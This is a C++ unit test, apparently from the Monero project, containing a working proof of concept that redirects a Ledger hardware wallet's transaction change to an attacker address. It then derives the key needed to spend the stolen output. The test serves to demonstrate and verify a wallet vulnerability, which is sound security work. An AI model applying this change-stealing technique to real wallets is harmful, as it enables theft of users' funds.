// Copyright (c) 2026, The Monero Project
//
// All rights reserved.
//
// Redistribution and use in source and binary forms, with or without modification, are
// permitted provided that the following conditions are met:
//
// 1. Redistributions of source code must retain the above copyright notice, this list of
//    conditions and the following disclaimer.
//
// 2. Redistributions in binary form must reproduce the above copyright notice, this list
//    of conditions and the following disclaimer in the documentation and/or other
//    materials provided with the distribution.
//
// 3. Neither the name of the copyright holder nor the names of its contributors may be
//    used to endorse or promote products derived from this software without specific
//    prior written permission.
//
// THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY
// EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF
// MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL
// THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL,
// SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO,
// PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
// INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT,
// STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF
// THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

#include "gtest/gtest.h"

#include "cryptonote_core/tx_verification_utils.h"
#include "ledger_tests_utils.h"
#include "ringct/rctSigs.h"

#undef MONERO_DEFAULT_LOG_CATEGORY
#define MONERO_DEFAULT_LOG_CATEGORY "ledger.steal_change"

namespace
{
std::string main_addr_str(const cryptonote::account_public_address &addr)
{
    return cryptonote::get_account_address_as_str(cryptonote::STAGENET, false, addr);
}
} //anonymous namespace

//----------------------------------------------------------------------------------------------------------------------
TEST(ledger, steal_change)
{
    // Our 3 players: Alice, Bob, and Eve. Alice (on Ledger device) tries to send funds to Bob, but Eve steals change
    const cryptonote::account_keys &alice = mock::get_global_ledger_account();
    const cryptonote::account_public_address &alice_addr = alice.m_account_address;
    cryptonote::account_base bob;
    bob.generate();
    const cryptonote::account_public_address &bob_addr = bob.get_keys().m_account_address;
    cryptonote::account_base eve;
    eve.generate();
    const cryptonote::account_public_address &eve_addr = eve.get_keys().m_account_address;

    // Transaction will spend 10, transfer 4 to Bob, offer 0.1 as fee, and get 5.9 back as change (except maybe not)
    constexpr rct::xmr_amount input_amount = 10 * COIN;
    constexpr rct::xmr_amount bob_amount = 4 * COIN;
    constexpr rct::xmr_amount fee = COIN / 10;
    constexpr rct::xmr_amount change_amount = input_amount - bob_amount - fee;

    LOG_PRINT_L1("Running Ledger change steal PoC with the following parameters:");
    LOG_PRINT_L1("    Our (Alice) primary address: " << main_addr_str(alice_addr));
    LOG_PRINT_L1("    Intended recipient (Bob) address: " << main_addr_str(bob_addr));
    LOG_PRINT_L1("    Thief (Eve) address: " << main_addr_str(eve_addr));
    LOG_PRINT_L1("    TX input amount: " << cryptonote::print_money(input_amount));
    LOG_PRINT_L1("    Bob destination amount: " << cryptonote::print_money(bob_amount));
    LOG_PRINT_L1("    TX fee: " << cryptonote::print_money(fee));
    LOG_PRINT_L1("    Expected change amount: " << cryptonote::print_money(change_amount));

    // destinations (EVE CHANGE!)
    std::vector<cryptonote::tx_destination_entry> dests{
        cryptonote::tx_destination_entry(bob_amount, bob.get_keys().m_account_address, false), // bob
        cryptonote::tx_destination_entry(change_amount, eve_addr, false), // evil change
    };

    // generate fake RingCT transaction input data to Alice
    ASSERT_TRUE(alice.get_device().set_mode(hw::device::TRANSACTION_PARSE));
    std::vector<cryptonote::tx_source_entry> srcs{
        mock::gen_ringed_tx_source_entry(input_amount, alice_addr , false)};

    // subaddress map for Alice
    std::unordered_map<crypto::public_key, cryptonote::subaddress_index> alice_subaddresses;
    alice_subaddresses[alice_addr.m_spend_public_key];

    // make tx from Alice to Bob, with Eve change
    cryptonote::transaction tx;
    crypto::secret_key tx_key;
    std::vector<crypto::secret_key> additional_tx_keys;
    ASSERT_TRUE(alice.get_device().set_mode(hw::device::TRANSACTION_CREATE_REAL));
    LOG_PRINT_L1("Look at your Ledger device now");
    // note that the `change_addr` is set to Eve's change address
    ASSERT_TRUE(cryptonote::construct_tx_and_get_tx_key(alice,
        alice_subaddresses,
        srcs,
        dests,
        /*change_addr=*/eve_addr,
        /*extra=*/{},
        tx,
        tx_key,
        additional_tx_keys,
        /*rct=*/true,
        /*rct_config=*/{rct::RangeProofPaddedBulletproof, 0},
        /*use_view_tags=*/true));
    ASSERT_EQ(2, tx.version);
    ASSERT_EQ(1, tx.vin.size());
    ASSERT_EQ(2, tx.vout.size());
    ASSERT_EQ(rct::RCTTypeBulletproofPlus, tx.rct_signatures.type);
    ASSERT_EQ(fee, tx.rct_signatures.txnFee);

    // get derivation used for stolen change (w/o HW device):
    //   K_d = 8 * [alice] k_v * R = 8 * r * [alice] K_v
    rct::key eve_kd_rct;
    ASSERT_TRUE(alice.get_device().scalarmultKey(eve_kd_rct,
        rct::pk2rct(alice.m_account_address.m_view_public_key),
        rct::sk2rct(tx_key)));
    eve_kd_rct = rct::scalarmult8(eve_kd_rct);
    crypto::key_derivation eve_kd;
    memcpy(&eve_kd, &eve_kd_rct, sizeof(eve_kd));
    LOG_PRINT_L1("Calculated key derivation to decrypt Eve's change output");

    /**
     * ATTACK IS FINISHED
     *
     * All that is left is for the attacker to broadcast the transaction, and exfiltrate eve_kd.
     * It really is as simple as that: simply tell the Ledger device that an address is change, and
     * it treats it as so.
     *
     * The rest of the PoC is to verify that it performs as advertised.
     */

    // verify all non-input consensus rules of tx (input data is made up and doesn't need to be checked)
    cryptonote::tx_verification_context tvc{};
    ASSERT_TRUE(cryptonote::ver_non_input_consensus(tx, tvc, HF_VERSION_BULLETPROOF_PLUS));
    LOG_PRINT_L1("Transaction rules verified");

    // get the change's output pubkey
    std::size_t change_local_output_idx;
    for (change_local_output_idx = 0; change_local_output_idx < dests.size(); ++change_local_output_idx)
    {
        if (dests.at(change_local_output_idx).addr == eve_addr)
            break;
    }
    ASSERT_LT(change_local_output_idx, dests.size());
    crypto::public_key eve_change_output;
    ASSERT_TRUE(cryptonote::get_output_public_key(tx.vout.at(change_local_output_idx), eve_change_output));

    // verify spendability by Eve, by re-deriving the output pubkey from Eve's Monero address
    ASSERT_TRUE(cryptonote::is_out_to_acc_precomp(
        {{eve_addr.m_spend_public_key, {}}},
        eve_change_output,
        eve_kd,
        /*additional_derivations=*/{},
        change_local_output_idx,
        hw::get_device("default")));
    LOG_PRINT_L1("Verified change output is spendable by Eve!");

    // verify amount of stolen change output
    crypto::secret_key output_scalar_derivation;
    crypto::derivation_to_scalar(eve_kd, change_local_output_idx, output_scalar_derivation);
    const rct::xmr_amount decoded_eve_amount = rct::decodeRctSimple(tx.rct_signatures,
        rct::sk2rct(output_scalar_derivation),
        change_local_output_idx,
        hw::get_device("default"));
    ASSERT_EQ(change_amount, decoded_eve_amount);
    LOG_PRINT_L1("Verified that Eve's change amount is as expected: " << cryptonote::print_money(decoded_eve_amount));

    // dump tx and keys
    const std::string tx_blob = cryptonote::tx_to_blob(tx);
    const std::string tx_hex = epee::to_hex::string(
        {reinterpret_cast<const unsigned char*>(tx_blob.data()), tx_blob.size()});
    LOG_PRINT_L1("Transaction:");
    LOG_PRINT_L1(tx_hex);
    LOG_PRINT_L1("Eve key derivation: " << eve_kd);
}
//----------------------------------------------------------------------------------------------------------------------